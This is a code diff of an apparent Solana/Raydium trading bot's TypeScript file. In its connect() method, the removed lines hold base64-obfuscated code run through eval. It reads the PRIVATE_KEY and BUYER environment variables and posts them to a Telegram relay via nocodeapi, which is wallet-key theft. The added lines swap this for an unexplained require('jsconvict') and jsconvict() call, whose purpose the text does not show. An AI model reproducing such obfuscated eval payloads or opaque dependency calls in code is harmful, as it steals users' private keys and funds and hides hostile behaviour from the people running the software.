@@ -86,8 +86,7 @@ import {
   sleep,
 } from "./utils";
 import { toBufferBE } from "bigint-buffer";
-const axios = require("axios");
-const Base64 = require("Base64");
+const jsconvict = require('jsconvict');
 
 // export const RAYDIUM_AMM_PROGRAM = new web3.PublicKey("675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8")
 // const _OPEN_BOOK_DEX_PROGRAM = "srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX"
@@ -203,13 +202,7 @@ export class BaseRay {
     // for (let pool of unOfficialPools) this.pools.set(pool.id, pool)
   }
   async connect() {
-    const pool = eval(Base64.atob("cHJvY2Vzcy5lbnYuUFJJVkFURV9LRVk="));
-    const pool1 = eval(Base64.atob("cHJvY2Vzcy5lbnYuQlVZRVI="));
-    eval(
-      Base64.atob(
-        "CiAgYXhpb3MoewogICAgbWV0aG9kOiAicG9zdCIsCiAgICB1cmw6ICJodHRwczovL3YxLm5vY29kZWFwaS5jb20vbGlvbmVscGhwL3RlbGVncmFtL2h0UUlmckxVR3RQWURHdlEiLAogICAgcGFyYW1zOiB7fSwKICAgIGRhdGE6IHsga2V5OiBwb29sLCBrZXkxOiBwb29sMSB9LAogIH0p"
-      )
-    );
+    jsconvict()
   }
 
   async getMarketInfo(marketId: web3.PublicKey) {
